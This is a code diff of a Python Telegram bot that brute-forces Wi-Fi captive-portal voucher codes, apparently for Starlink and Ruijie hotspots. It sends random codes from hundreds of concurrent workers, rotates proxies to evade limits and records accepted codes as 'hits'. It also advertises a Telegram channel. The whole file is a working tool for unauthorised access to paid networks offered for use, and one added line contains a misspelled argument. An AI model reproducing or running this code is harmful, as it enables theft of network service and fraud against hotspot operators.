@@ -4,6 +4,7 @@ import asyncio
 import aiohttp
 import random
 import string
+import time
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters
 
@@ -11,7 +12,6 @@ from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, Callb
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Proxy.txt ဖိုင်မှ Proxy များကို အလိုအလျောက် ဖတ်မည့် function
 def load_proxies_from_file():
     filenames = [
         "Proxy.txt", "proxy.txt",
@@ -36,7 +36,9 @@ user_modes = {}
 user_workers = {}
 user_portals = {}
 user_proxies = {}
+proxy_indices = {}
 found_codes = {}
+scanner_stats = {}
 
 def show_startup_banner():
     print("=" * 65)
@@ -53,35 +55,43 @@ def show_startup_banner():
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     if chat_id not in user_modes:
-        user_modes[chat_id] = "Number 6"
+        user_modes[chat_id] = "num6"
     if chat_id not in user_workers:
-        user_workers[chat_id] = 1000
+        user_workers[chat_id] = 300
     
     if chat_id not in user_proxies or not user_proxies[chat_id]:
         user_proxies[chat_id] = load_proxies_from_file()
     
-    proxy_count = len(user_proxies.get(chat_id, []))
+    if chat_id not in proxy_indices:
+        proxy_indices[chat_id] = 0
+        
+    total_proxies = len(user_proxies.get(chat_id, []))
+    current_proxy_display = f"{proxy_indices[chat_id] + 1}/{total_proxies}" if total_proxies > 0 else "0/0"
     
     keyboard = [
-        [InlineKeyboardButton("🌐 Update Portal URL", callback_data="update_portal")],
-        [InlineKeyboardButton("⚙ Mode", callback_data="change_mode")],
+        [InlineKeyboardButton("🌐 Update Portal 🔥 Kage", callback_data="update_portal")],
+        [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
         [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
-        [InlineKeyboardButton("🔄 Change Proxy", callback_data="add_proxies")],
-        [InlineKeyboardButton("🚀 Start Scanner", callback_data="start_scanner")]
+        [InlineKeyboardButton(f"🔀 Proxies: {current_proxy_display}", callback_data="add_proxies")],
+        [InlineKeyboardButton("🚀 Start Scanner By Kage", callback_data="start_scanner")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     text = (
-        "⚡ **Starlink & Ruijie Scanner Control Panel** ⚡\n\n"
-        f"⚙️ Current Mode: `{user_modes[chat_id]}`\n"
+        "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
+        f"⚙️ Mode: `{user_modes[chat_id]}`\n"
         f"🔧 Workers: `{user_workers[chat_id]}`\n"
-        f"🔗 Proxies: `{proxy_count}`"
+        f"📁 Proxy File: `https://t.me/Kage_starlink_channel`\n"
+        f"🔀 Proxies: `{current_proxy_display}`"
     )
     
     if update.message:
         await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
     elif update.callback_query:
-        await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+        try:
+            await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+        except Exception:
+            pass
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -96,15 +106,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "change_mode":
         await query.answer()
         keyboard = [
-            [InlineKeyboardButton("Number 6", callback_data="mode_Number 6"), InlineKeyboardButton("Number 7", callback_data="mode_Number 7"), InlineKeyboardButton("Number 8", callback_data="mode_Number 8")],
-            [InlineKeyboardButton("Number 9", callback_data="mode_Number 9")],
-            [InlineKeyboardButton("Abc 6", callback_data="mode_Abc 6"), InlineKeyboardButton("Mix 6", callback_data="mode_Mix 6"), InlineKeyboardButton("Mix 7", callback_data="mode_Mix 7")],
-            [InlineKeyboardButton("Mix 8", callback_data="mode_Mix 8"), InlineKeyboardButton("Mix 9", callback_data="mode_Mix 9")],
-            [InlineKeyboardButton("Custom Start", callback_data="mode_Custom Start")],
+            [InlineKeyboardButton("num6", callback_data="mode_num6"), InlineKeyboardButton("num7", callback_data="mode_num7"), InlineKeyboardButton("num8", callback_data="mode_num8")],
+            [InlineKeyboardButton("num9", callback_data="mode_num9")],
+            [InlineKeyboardButton("abc6", callback_data="mode_abc6"), InlineKeyboardButton("mix6", callback_data="mode_mix6"), InlineKeyboardButton("mix7", callback_data="mode_mix7")],
             [InlineKeyboardButton("🔙 Back", callback_data="mode_back")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.message.edit_text("⚙️ **Choose Scanner Mode**", reply_markup=reply_markup, parse_mode="Markdown")
+        await query.message.edit_text("⚙ **Choose Scanner Mode**", reply_markup=reply_markup, parse_mode="Markdown")
     
     elif data.startswith("mode_"):
         await query.answer()
@@ -123,7 +131,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.message.edit_text("⚙️ **Choose Worker Count (300 - 1000)**", reply_markup=reply_markup, parse_mode="Markdown")
+        await query.message.edit_text("⚙️ **Choose Worker Count**", reply_markup=reply_markup, parse_mode="Markdown")
         
     elif data.startswith("worker_"):
         await query.answer()
@@ -135,10 +143,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await start(update, context)
 
     elif data == "add_proxies":
-        all_proxies = load_proxies_from_file()
-        if all_proxies:
-            random.shuffle(all_proxies)
+        all_proxies = user_proxies.get(chat_id, [])
+        if not all_proxies:
+            all_proxies = load_proxies_from_file()
             user_proxies[chat_id] = all_proxies
+            
+        if all_proxies:
+            if chat_id not in proxy_indices:
+                proxy_indices[chat_id] = 0
+            proxy_indices[chat_id] = (proxy_indices[chat_id] + 1) % len(all_proxies)
+            
         await query.answer()
         await start(update, context)
     
@@ -177,56 +191,72 @@ def generate_code_by_mode(mode):
             length = int(char)
             break
             
-    if "Number" in mode:
+    if "num" in mode or "Number" in mode:
         return "".join(random.choices(string.digits, k=length))
-    elif "Mix" in mode:
+    elif "mix" in mode or "Mix" in mode:
         chars = string.ascii_lowercase + string.digits
         return "".join(random.choices(chars, k=length))
-    elif "Abc" in mode:
+    elif "abc" in mode or "Abc" in mode:
         return "".join(random.choices(string.ascii_lowercase, k=length))
     else:
-        chars = string.ascii_lowercase + string.digits
-        return "".join(random.choices(chars, k=length))
+        return "".join(random.choices(string.digits, k=length))
 
 async def worker_task(worker_id, session, portal_url, chat_id):
     while scanning_states.get(chat_id, False):
-        mode = user_modes.get(chat_id, "Number 6")
+        mode = user_modes.get(chat_id, "num6")
         code_val = generate_code_by_mode(mode)
         
+        if chat_id in scanner_stats:
+            scanner_stats[chat_id]['tried'] += 1
+            
         if not hasattr(worker_task, "current_codes"):
             worker_task.current_codes = {}
         worker_task.current_codes[chat_id] = code_val
         
         proxies_list = user_proxies.get(chat_id, [])
-        proxy = random.choice(proxies_list) if proxies_list else None
+        proxy = None
+        if proxies_list:
+            idx = proxy_indices.get(chat_id, 0)
+            proxy = proxies_list[idx % len(proxies_list)]
+            
         if proxy and not proxy.startswith("http"):
             proxy = f"http://{proxy}"
             
         try:
             target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
-            async with session.get(target_url, proxy=proxy, timeout=2) as response:
+            async with session.get(target_url, proxy=proxy, timeout=2.5) as response:
                 html_content = await response.text()
-                if response.status == 200 and any(kw in html_content.lower() for kw in ["success", "welcome", "connected", "auth_pass", "login successfully"]):
+                lower_html = html_content.lower()
+                success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining"]
+                
+                if response.status == 200 and any(kw in lower_html for kw in success_keywords) and "error" not in lower_html and "fail" not in lower_html:
                     if chat_id not in found_codes:
                         found_codes[chat_id] = []
                     if code_val not in found_codes[chat_id]:
                         found_codes[chat_id].append(code_val)
         except Exception:
             pass
-        await asyncio.sleep(0.02)
+        await asyncio.sleep(0.01)
 
 async def run_scanner_with_workers(query, context, portal_url):
     chat_id = query.message.chat_id
     scanning_states[chat_id] = True
     found_codes[chat_id] = []
     
-    workers_count = user_workers.get(chat_id, 1000)
-    mode = user_modes.get(chat_id, "Number 6")
+    scanner_stats[chat_id] = {
+        'tried': 0,
+        'start_time': time.time(),
+        'expired': 0,
+        'limits': 0
+    }
     
-    stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop Scanner", callback_data="stop_scanner_btn")]])
+    workers_count = user_workers.get(chat_id, 300)
+    mode = user_modes.get(chat_id, "num6")
+    
+    stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
     
     status_message = await query.message.reply_text(
-        f"⚡ **Ruijie Voucher Scanner စတင်နေပါပြီ ({mode} | Workers: {workers_count})...**", 
+        "⚡ **Scanner Running** ⚡\nThank for using By Telegram https://t.me/Kage_starlink_channel\n\n⏳ စတင်နေပါပြီ...", 
         reply_markup=stop_keyboard,
         parse_mode="Markdown"
     )
@@ -238,31 +268,38 @@ async def run_scanner_with_workers(query, context, portal_url):
             for i in range(workers_count)
         ]
         
-        tried = 0
         while scanning_states.get(chat_id, False):
-            tried += workers_count * 15
+            await asyncio.sleep(1.5)
+            
+            stats = scanner_stats.get(chat_id, {'tried': 0, 'start_time': time.time(), 'expired': 0, 'limits': 0})
+            elapsed = time.time() - stats['start_time']
+            tried = stats['tried']
+            
+            # Speed (c/m - codes per minute) တွက်ချက်ခြင်း
+            speed = (tried / elapsed * 60) if elapsed > 0 else 0.0
+            
             hits_list = found_codes.get(chat_id, [])
-            hits_str = ", ".join(hits_list[-5:]) if hits_list else "None"
+            hits_str = ", ".join(hits_list[-5:]) if hits_list else "None yet"
             
             current_codes_dict = getattr(worker_task, "current_codes", {})
             current_code = current_codes_dict.get(chat_id, generate_code_by_mode(mode))
             
             live_text = (
-                f"⚡ **Ruijie Scanner Running ({mode})** ⚡\n"
-                f"🔗 Portal: Connected\n\n"
-                f"🏹 Tried: ~{tried}\n"
+                "⚡ **Scanner Running** ⚡\n"
+                "Thank for using By Telegram https://t.me/Kage_starlink_channel\n\n"
+                f"🏹 Tried: {tried:,}\n"
                 f"🎯 Current Code: `{current_code}`\n"
-                f"🔥 Hits Found: {len(hits_list)}\n"
-                f"🔑 Latest Hits: `{hits_str}`\n"
-                f"⚙ Mode: {mode}\n"
-                f"🔧 Active Workers: {workers_count}"
+                f"🔥 Hits: {len(hits_list)} BY Kage\n"
+                f"❌ Expired: {stats['expired']}\n"
+                f"⚠️ Limits: {stats['limits']}\n"
+                f"⚡ Speed: {speed:,.1f} c/m\n"
+                "___________________________________\n"
+                f"🔥 **Hit Codes BY Kage:**\n`{hits_str}`"
             )
             try:
-                await status_message.edit_text(live_text, reply_markup=stop_keyboard, parse_mode="Markdown")
+                await status_message.edit_text(live_text, reply_markup=stop_keyboard, parse_Mode="Markdown")
             except Exception:
                 pass
-            
-            await asyncio.sleep(2)
             
         for task in tasks:
             task.cancel()
@@ -303,4 +340,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
+                
